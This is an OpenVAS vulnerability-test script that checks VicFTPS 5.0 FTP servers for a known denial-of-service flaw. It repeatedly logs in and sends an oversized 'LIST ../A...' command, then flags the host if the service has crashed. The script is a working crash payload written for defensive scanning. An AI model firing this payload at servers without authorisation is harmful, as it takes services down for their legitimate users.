###############################################################################
# OpenVAS Vulnerability Test
#
# VicFTPS 'LIST' Command Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103091");
  script_version("2020-08-24T08:40:10+0000");
  script_tag(name:"last_modification", value:"2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2011-02-25 13:54:37 +0100 (Fri, 25 Feb 2011)");
  script_bugtraq_id(46546);
  script_cve_id("CVE-2008-2031");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_name("VicFTPS 'LIST' Command Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/46546");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_family("FTP");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/vicftps/detected");

  script_tag(name:"summary", value:"VicFTPS is prone to a remote denial-of-service vulnerability because
  it fails to handle specially crafted input.");

  script_tag(name:"impact", value:"Successfully exploiting this issue will allow an attacker to crash the
  affected application, denying further service to legitimate users. Arbitrary code execution may also be possible.
  This has not been confirmed.");

  script_tag(name:"affected", value:"VicFTPS 5.0 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of
  this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "VicFTPS" >!< banner)
  exit(0);

soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "VicFTPS" >!< banner){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

for(i = 0; i < 5; i++ ) {
  soc1 = open_sock_tcp(ftpPort);
  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(login_details) {
    buf = string("LIST ",crap(data:"../A",length:100),"\r\n");
    send(socket:soc1, data:buf);
    close(soc1);
    sleep(1);
  }
}

sleep(5);
soc = open_sock_tcp(ftpPort);

if(!soc) {
  security_message(port:ftpPort);
  exit(0);
} else {
  close(soc);
}

exit(0);
